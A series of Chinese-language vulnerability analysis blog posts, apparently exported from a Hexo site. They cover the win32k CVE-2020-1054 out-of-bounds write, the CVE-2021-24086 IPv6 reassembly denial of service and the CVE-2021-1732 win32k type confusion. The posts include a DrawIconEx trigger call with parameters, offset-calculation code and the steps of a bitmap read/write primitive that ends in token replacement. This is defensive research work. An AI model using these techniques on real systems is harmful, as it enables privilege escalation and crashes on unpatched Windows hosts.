  ULONG32 ulShareCount;      // 0x08
  WORD cExclusiveLock;       // 0x0A
  WORD BaseFlags;        // 0x0C
  ULONG64 Tid;           // 0x10
} BASEOBJECT64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SURFOBJ结构体</p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct _SURFOBJ64{
  BASEOBJECT64 baseObj;    // 0x00
  ULONG64 dhsurf;         // 0x18
  ULONG64 hsurf;          // 0x20
  ULONG64 dhpdev;         // 0x28
  ULONG64 hdev;           // 0x30
  SIZEL sizlBitmap;       // 0x38
  ULONG64 cjBits;         // 0x40
  ULONG64 pvBits;         // 0x48
  ULONG64 pvScan0;        // 0x50
  ULONG32 lDelta;         // 0x58
  ULONG32 iUniq;          // 0x5C
  ULONG32 iBitmapFormat;  // 0x60
  USHORT iType;           // 0x64
  USHORT fjBitmap;        // 0x66
} SURFOBJ64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>pvScan01指向Pixel Data数据区，这些数据可以通过GetBitmapBits和SetBitmapBits控制</p>
<p>sizlBitmap是两个Dword，包含位图的高度和宽度。</p>
<h3 id="触发地点"><a href="#触发地点" class="headerlink" title="触发地点"></a>触发地点</h3><p>崩溃地址为win32k!vStrWrite01+0x36a，<code>mov esi,[r14]</code></p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160100705.png"></p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824113228498.png"></p>
<pre class="line-numbers language-none"><code class="language-none">.text:FFFFF97FFF0A2175                 lea     r14, [rcx+rax*4]
.text:FFFFF97FFF0A2179                 test    ebx, ebx
.text:FFFFF97FFF0A217B                 js      short loc_FFFFF97FFF0A2192
.text:FFFFF97FFF0A217D                 mov     rax, [rsp+0A8h+arg_10]
.text:FFFFF97FFF0A2185                 cmp     ebx, [rax+38h]
.text:FFFFF97FFF0A2188                 jge     short loc_FFFFF97FFF0A2192
.text:FFFFF97FFF0A218A                 mov     esi, [r14]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>内存地址由rcx和rax决定。</p>
<h3 id="vStrWrite01流程"><a href="#vStrWrite01流程" class="headerlink" title="vStrWrite01流程"></a>vStrWrite01流程</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824145835155.png"></p>
<p>loc_FFFFF97FFF0A20B4</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824172844847.png"></p>
<p>用rcx和rax计算r14的内存地址，之后执行mov esi,[r14]指令。</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824150841161.png"></p>
<p>如果r14地址合法，对读到的值进行or或者and运算，并把运算后的值赋值回r14指向的内存地址。</p>
<p>如果控制了崩溃处的destAddr(越界地址oobAddr),就可以进行内存破坏。</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824161532452.png"></p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160327694.png"></p>
<p>之后对rcx进行操作，判断r11d是否为0，不为0跳转到loc_FFFFF97FFF0A212B，进行r11d减1操作。</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824165106838.png"></p>
<p>函数流程如下</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">do</span> <span class="token punctuation">{</span>
		<span class="token comment">/* 
		lea  r14, [rcx + rax * 4] 
		rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0
		rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5
		*/</span>
		r14 <span class="token operator">=</span> rcx <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>prun<span class="token operator">-&gt;</span>xrl<span class="token operator">-&gt;</span>xPos <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取时的oobAddr,rcx + rax * 4</span>
		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
		tmp <span class="token operator">=</span> <span class="token operator">*</span>destAddr  <span class="token comment">//崩溃</span>

		<span class="token keyword">do</span> <span class="token punctuation">{</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				tmp <span class="token operator">|=</span> xxxxxx
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span> <span class="token punctuation">{</span>
				tmp <span class="token operator">&amp;=</span> xxxxxx
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>r11d<span class="token punctuation">)</span>
            <span class="token operator">--</span>r11d<span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
				<span class="token operator">*</span>destAddr <span class="token operator">=</span> tmp<span class="token punctuation">;</span> <span class="token comment">//满足条件，写入oobAddr</span>
			<span class="token punctuation">}</span>
	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
        
		<span class="token comment">/*
		add rcx, rax
        rcx = rcx + pSurf-&gt;lDelta
        */</span>
		rcx <span class="token operator">+=</span> pSurf<span class="token operator">-&gt;</span>lDelta<span class="token punctuation">;</span><span class="token comment">//每次循环obbAddr会增加</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对r14指向的内存进行读写</p>
<pre class="line-numbers language-none"><code class="language-none">rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0
rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5
lea  r14, [rcx+rax*4]
rcx = rcx + pSurf-&gt;lDelta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>循环的操作如下</p>
<pre class="line-numbers language-none"><code class="language-none">for(i = 0; i&lt;prun-&gt;yPos; i++)
{
    r14 = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0 + 4*(prun-&gt;xrl-&gt;xPos) + i*pSurf-&gt;lDelta
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>崩溃时的指令是<code>mov esi, [r14]</code>，由于引用无效的内存发生，是越界写入漏洞。崩溃时访问的地址能通过oob控制其中的内容。影响读写oobAddr的值有<code>prun-&gt;yPos</code>，<code>pSurf-&gt;lDelta</code>，<code>prun-&gt;xrl-&gt;xPos</code>和循环次数</p>
<pre class="line-numbers language-none"><code class="language-none">DrawIconEx(exploit_dc, 0x0, 0x0, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, 0x0, 0x1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>yPos有DrawIconEx中的arg3和arg有关</p>
<pre class="line-numbers language-none"><code class="language-none">##include&lt;stdio.h&gt;
int main(){
    int arg3 = 0xb;
    int arg6 = 0xffe00000;
    int yPos = 0;
    int remainder_count = 0;
    int quotient_count = 0;
    int mod_num = (arg3+1-(arg6+arg3+1)) % 0x20;
    int div_num = (arg3+1-(arg6+arg3+1))/ 0x20;
    if(0xf+mod_num&gt;=0x20){
        remainder_count = mod_num;
        quotient_count = div_num+1;
        yPos = (remainder_count-1-1)*(div_num+1) \
              + div_num +arg6 + arg3+1;
    }else{
        remainder_count = mod_num;
        quotient_count = div_num;
        yPos = (0x20-1-1)*div_num+arg6+arg3+1;
    }
    printf("arg3: 0x%x\n",arg3);
    printf("arg6: 0x%x\n",arg6);
    printf("yPos First: 0x%x\n",yPos);
    printf("yPos Second: 0x%x\n",(yPos+quotient_count));
    return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>prun -&gt; xrl.xPos:0x900</p>
<p>pSurf-&gt;lDelta:0xa2a0</p>
<p>prun-&gt;xPos:0xb</p>
<h3 id="地址任意读写"><a href="#地址任意读写" class="headerlink" title="地址任意读写"></a>地址任意读写</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906100016677.png"></p>
<p>SIZEL sizlBitmap，是限定位图的长宽的，存储Pixel Data的长宽大小，四字节写可修改Pixel Data的大小</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095832694.png"></p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>CreateCompatibleBitmap申请VulBITMAP，并获得VulBITMAP的内核地址<br>计算oob读写地址<br>在oob读地址处申请BITMAP1，在oob写处申请BITMAP2，大小为0x7000<br>触发漏洞，读取BITMAP1中的sIzlBitmap值，修改BITMAP2对象的sizlBitmap值，对BITMAP2使用SetBitmapBits和GetBitmapBits越界读写BITMAP3的pvScan0<br>BITMAP2作为Manager，BITMAP3作为worker，实现任意读写，替换token等提权</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095502566.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-24086 TCPIP拒绝服务漏洞分析</title>
    <url>/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h2><p>Windows IPv6协议栈存在的一处拒绝服务漏洞，漏洞的根本原因是IPv6的嵌套分片机制中，当尝试递归重组嵌套的分片时会计算内部有效载荷中包含的所有扩展标头，当重组扩展头约为0xffff字节的数据包时，tcpip!IPv6ReassembleDatagram中发生的NULL指针解引用发生崩溃。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>漏洞是在tcpip!Ipv6pReassembleDatagram函数中，向rax中写入数据时导致崩溃。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108162657004.png"></p>
<h3 id="tcpip-Ipv6pReassembleDatagram"><a href="#tcpip-Ipv6pReassembleDatagram" class="headerlink" title="tcpip!Ipv6pReassembleDatagram"></a>tcpip!Ipv6pReassembleDatagram</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108144319506.png"></p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108150549114.png"></p>
<h3 id="NdisGetDataBuffer"><a href="#NdisGetDataBuffer" class="headerlink" title="NdisGetDataBuffer"></a>NdisGetDataBuffer</h3><pre class="line-numbers language-none"><code class="language-none">NDIS_EXPORTED_ROUTINE PVOID NdisGetDataBuffer(
  [in]           NET_BUFFER *NetBuffer,    //指向NET_BUFFER的指针
  [in]           ULONG      BytesNeeded,   //请求的数据的连续的字节数
  [in, optional] PVOID      Storage,       //指向缓冲区的指针;如果调用方未提供任何缓冲区，则为 NULL 。 缓冲区的大小必须大于或等于 BytesNeeded 中指定的字节数。 如果此值不是 NULL，并且请求的数据不是连续的，则 NDIS 会将请求的数据复制到 存储 指示的区域。  
  [in]           ULONG      AlignMultiple, //幂对齐
  [in]           ULONG      AlignOffset    //对齐倍数的偏移量
);

NdisGetDataBuffer 返回指向连续数据的开头的指针，或者返回 NULL。
如果 NetBuffer 参数指向的 NET_BUFFER 结构中NET_BUFFER_DATA结构的 DataLength 成员小于 BytesNeeded 参数中的值，则返回值为 NULL。
如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。 如果数据不连续，NDIS 使用 存储 参数，如下所示：
如果 Storage 参数为非 NULL，则 NDIS 会将数据复制到 存储中的缓冲区。 返回值是传递给 Storage 参数的指针。
如果 Storage 参数为 NULL，则返回值为 NULL。
由于无法映射数据缓冲区的低资源条件，返回值也可能为 NULL 。 即使数据连续或存储参数为非 NULL，也可能发生这种情况。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>NdisGetDataBuffer函数返回数据指针或者NULL，rax是NdisGetDataBuffer函数的返回值，当赋值为0，之后赋值数据没有判断是否是空指针，就会导致异常。</p>
<h3 id="ndis-NdisGetDataBuffer"><a href="#ndis-NdisGetDataBuffer" class="headerlink" title="ndis!NdisGetDataBuffer"></a>ndis!NdisGetDataBuffer</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108152123775.png"></p>
<p>NetBuffer-&gt;DataLength小于传进来的第二个参数BytesNeeded就会返回0。</p>
<h3 id="tcpip-NetioRetreatNetBuffer"><a href="#tcpip-NetioRetreatNetBuffer" class="headerlink" title="tcpip!NetioRetreatNetBuffer"></a>tcpip!NetioRetreatNetBuffer</h3><p>在调用ndis!NdisGetDataBuffer之前调用了tcpip!NetioRetreatNetBuffer函数</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109102806617.png"></p>
<p>函数调用之前，NET_BUFFER-&gt;CurrentMdlOffset还没有设置，会调用NdisRetreatNetBufferDataStart函数设置NET_BUFFER结构。</p>
<p>NdisRetreatNetBufferDataStart会把NET_BUFFER-&gt;DataLength设置为0x10,函数返回0</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105241377.png"></p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105650123.png"></p>
<p>a2 BytesNeeded是v3+0x28，v3是a2偏移0x68，a2是Ipv6pReceiveFragment函数中由IppCreateInReassemblySet生成，满足条件后才会调用tcpip!Ipv6pReassembleDatagram进行重组。</p>
<h3 id="Ipv6pReceiveFragment"><a href="#Ipv6pReceiveFragment" class="headerlink" title="Ipv6pReceiveFragment"></a>Ipv6pReceiveFragment</h3><p>Ipv6pReceiveFragment函数作用是处理分片，当最后一个分片校验通过，就会调用tcpip!Ipv6pReassembleDatagram函数进行重组。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109110612827.png"></p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>攻击机：kali2022<br>靶机：win10专业版1709（16299.125）</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164353456.png"></p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164441542.png"></p>
<p>NdisGetDataBuffer有返回NULL的情况，可以使NET_BUFFER为NULL，NdisGetDataBuffer会返回NULL，就会触发BSOD空指针引用。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109113544500.png"></p>
<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>Ipv6pReassembleDatagram增加了判断，当重组数据包options_data_length和fragment_sum_length和大于0xFFFF会调用IppDeleteFromReassmblySet函数删除这个包的信息，跳过重组。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140212506.png"></p>
<p>在NetioRetreaNetBuffer函数调用处将第二个参数长度变成32位，避免后续调用NdisGetDataBuffer参数不一致。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140232843.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-1732 win32K内核提权漏洞分析</title>
    <url>/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>内存破坏类内核提权漏洞一般是由C/C++的不安全操作引发，最常见的是Win32k组件中由于Callback机制导致的UAF漏洞。Windows操作系统设计初期，Win32k子系统是在用户态的，从Windows NT4开始，这部分代码移到了内核态，内核态增加了一个Win32k.sys模块，导致3个不安全的因素1.新的系统调用（1100+syscalls）2.用户模式回调（User-mode Callback）3.用户态和内核态之间的共享数据（Share data）。win32k是微软Windows子系统的图形GUI组件，该组件被用于Windows操作系统桌面的图形打印。由于win32k架构的原因，win32k的内核组件需要通过用户模式回调函数对用户模式下的代码进行调用，方便窗口的创建和管理。Win32k内核函数（如xxxCreateWindowEx）会通过用户进程PEBKernelCallBackTable生成回调函数（如xxxClientAllocWindowClassExtraBytes）,当用户模式回调函数完成后，会执行NtCallbackReturn将预期的返回参数传回内核，由于这些回调函数无状态特性，可以造成许多与对象锁定机制有关的漏洞。Win32k漏洞通常会利用tagWND数据结构的桌面对象，然后借助内核读写原语转化为纯数据攻击。</p>
<p>纯数据攻击（data-only attacks）过程通常分为两步：</p>
<ul>
<li><p>发现漏洞</p>
</li>
<li><p>使用对象字段（如tagWND.cbWndExtra）上特定OS API来利用现有的或新的读写原语。</p>
<p>tagWND数据结构有两个字段tagWnd.cbWndExtra和tagWND.ExtraBytes。当CreateWindowEx创建窗口时，可以注册窗口类时通过WNDCLASSEXA结构体中的cbWndExtra字段直接从内存中的tagWND对象之后请求额外的内存字节。额外的字节数是由cbWndExtra字段控制的，保存在ExtraBytes字段中。读写源于创建过程如下：</p>
<p>1.找到一个用于对内存中名为 WND0的tagWND对象执行写操作的漏洞（如UAF）。</p>
<p>2.在内存中先前破坏的WND0附近分配另一个名为WND1的tagWN对象</p>
<p>3.Wnd0.cbwndextra覆盖为一个非常大的值，如0xFFFFFFF</p>
<p>4.在WND0上调用一个API，比如SetWindowLongPtr,以越界写入WND1中的相关字段。</p>
</li>
</ul>
<p>多种利用Win32k内核的用户模式回调函数的漏洞例如CVE-2014-4113、CVE-2015-0057、CVE-2016-7255、CVE-2019-0808漏洞，都是利用Windows内核的tagWND读写功能来实现提权的。</p>
<p><strong>创建窗口相关的结构体和函数</strong></p>
<p>创建窗口函数：CreatWindowEx</p>
<p>用户态的窗口数据结构体：WNDCLASSEX</p>
<p>窗口类扩展内存大小：cbClsExtra</p>
<p>窗口扩展内存大小：cbWndExtra</p>
<p>窗口数据保存在内核态使用的结构体：tagWND和tagWNDK</p>
<p>用户态调用SetWindowLong可以设置窗口扩展内存数据</p>
<p>tagWnd:是Windows内核用来描述用户创建的窗口的内核数据结构，保存着窗口相关的所有信息。</p>
<p>tagBody:tagWND+0x28处的值，保存着tagWND的主体信息，由于Win32k TypeIsolation的作用，Windows内核将大部分User Object和Gdi Object,比如Window、Bitmap、Palette等对象头和对象主体之间分别从不同的位置开辟空间。</p>
<p><strong>tagWNDCLASSEXW</strong></p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct tagWNDCLASSEXW {
    UINT        cbSize;        // 该结构体的大小，通过这个字段来区分桌面开发的新旧版本
    /* Win 3.x */
    UINT        style;         // 窗口类的风格
    WNDPROC     lpfnWndProc;   // 窗口的消息处理函数
    int         cbClsExtra;    // 窗口类的扩展内存大小
    int         cbWndExtra;    // 窗口的扩展内存大小
    HINSTANCE   hInstance;     // 该窗口类的窗口消息处理函数所属的应用实例
    HICON       hIcon;         // 该窗口类所用的图标
    HCURSOR     hCursor;       // 该窗口类所用的光标
    HBRUSH      hbrBackground; // 该窗口类所用的背景刷
    LPCWSTR     lpszMenuName;  // 该窗口类所用的菜单资源
    LPCWSTR     lpszClassName; // 该窗口类的名称
    /* Win 4.0 */
    HICON       hIconSm;       // 该窗口类所用的小像标
} WNDCLASSEXW;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在用户态创建窗口时，需要调用RegisterClass注册窗口类，每个窗口类有自己的名字，调用CreateWindow创建窗口时传入类的名字，即可创建对应的窗口实例。<br>当cbWndExtra不为0时，系统会申请一段对应大小的空间，如果回调到用户态申请空间时，可能会触发漏洞。</p>
<p><strong>tagWND</strong></p>
<pre class="line-numbers language-none"><code class="language-none">ptagWND             //内核中调用ValidateHwnd传入用户态窗口句柄可返回此数据指针
    0x18 unknown
        0x80 kernel desktop heap base   //内核桌面堆基址
    0x28 ptagWNDk  
    0xA8 spMenu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>tagWNDK</strong></p>
<pre class="line-numbers language-none"><code class="language-none">struct tagWNDK
{
    ULONG64 hWnd;               //+0x00
    ULONG64 OffsetToDesktopHeap;//+0x08 tagWNDK相对桌面堆基址偏移
    ULONG64 state;              //+0x10
    DWORD dwExStyle;            //+0x18
    DWORD dwStyle;              //+0x1C
    BYTE gap[0x38];
    DWORD rectBar_Left;         //0x58
    DWORD rectBar_Top;          //0x5C
    BYTE gap1[0x68];
    ULONG64 cbWndExtra;         //+0xC8 窗口扩展内存的大小
    BYTE gap2[0x18];
    DWORD dwExtraFlag;          //+0xE8  决定SetWindowLong寻址模式
    BYTE gap3[0x10];            //+0xEC
    DWORD cbWndServerExtra;     //+0xFC
    BYTE gap5[0x28];
    ULONG64 pExtraBytes;    //+0x128 模式1：内核偏移量 模式2：用户态指针
};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当WNDCLASSEXW 中的cbWndExtra值不为0时，创建窗口时内核会回调到用户态函数USER32!_xxxClientAllocWindowClassExtraBytes申请一块cbWndExtra大小的内存区域，并且将返回地址保存在tagWNDK结构体的pExtraBytes变量中。</p>
<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>CVE-2021-1732是Windows Win32k组件驱动模块Win32kfull.sys(Windows内核用来实现图形化系统的核心驱动程序)的LPE漏洞，由于创建窗口时调用win32kfull!xxxCreateWindowEx过程中会进行用户模式回调（KeUserModeCallback）,从而给了用户态进程利用的机会。该漏洞由安恒信息在2020年12月捕获，在2021年2月公开披露，相关样本在蔓玲花（BITTER）APT组织在某次被披露的攻击行动中使用，可以在本地将普通用户进程权限提升为system权限。</p>
<p>漏洞类型：Type Confusion(类型混淆漏洞)</p>
<p>影响版本：</p>
<pre class="line-numbers language-none"><code class="language-none">Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
Windows Server, version 1909 (Server Core installation)
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
Windows 10 Version 1803 for ARM64-based Systems
Windows 10 Version 1803 for x64-based Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>用户态进程在调用CreateWindowEx创建的带有扩展内存的windows窗口时，内核态图形驱动win32full.sys模块的xxxCreateWindowEx函数会通过nt!KeUerModeCallback回调机制调用用户态函数user32!_xxxClientAllocWindowClassExtraBytes,向内核返回用户态创建的窗口扩展内存。该返回值的解释由窗口对应tagWND结构体的dwExtarFlag字段规定，如果dwExtraFlag包含0x800属性，返回值被视作相对内核桌面堆起始地址的偏移。攻击者可以hook user32!xxxClientAllocWindowClassExtraBytes函数，通过一些手段使得dwExtarFlag包含0x800属性，然后直接调用dtdll!NtCallbackReturn向内核返回一个任意值。回调结束后，dwExtraFlag不会被清除，未经效验的返回值直接被用于堆内存寻址（桌面堆起始地址+返回值），引发内存越界访问，攻击者通过构造和api封装，获得内存读写能力，最后复制system进程的token到进程完成提权。</p>
<p>正常逻辑：<br>1.CreateWindowsEx会调用内核函数xxxCreateWindowEx来实现窗口创建。</p>
<p>2.xxxCreateWindowEx内部会调用xxxClientAllocWindowClassExtraBytes来创建额外的空间，之后将返回的地址保存在tagBody+0x128处</p>
<p>3.xxxClientAllowWindowClassExtraBytes会切换到用户带执行开辟空间的动作，空间申请完成后，调用NtCallbackReturn返回到内核执行点继续执行。</p>
<p>漏洞逻辑：<br>漏洞发生在第二步，返回用户态执行开辟空间的代码中，若此时调用NtUserConsoleControl</p>
<p>1.NtUserConsoleControl内部会修改tagBody+0xE8处的Flag，通过逻辑或其他方式添加0x800标志，*(tagBody+0xE8) | =0x800</p>
<p>2.0x800这个标志tagBody+0x128处保存的值是否一个相对偏移，若是，则值为相对DesktopHeap基址的偏移，若不是，则保存用户态的地址。</p>
<p>3.标志位的修改，导致后续对tagBody+0x128处的值被作为偏移来使用，最终在xxxDestroyWindow发生使用，从而产生崩溃。</p>
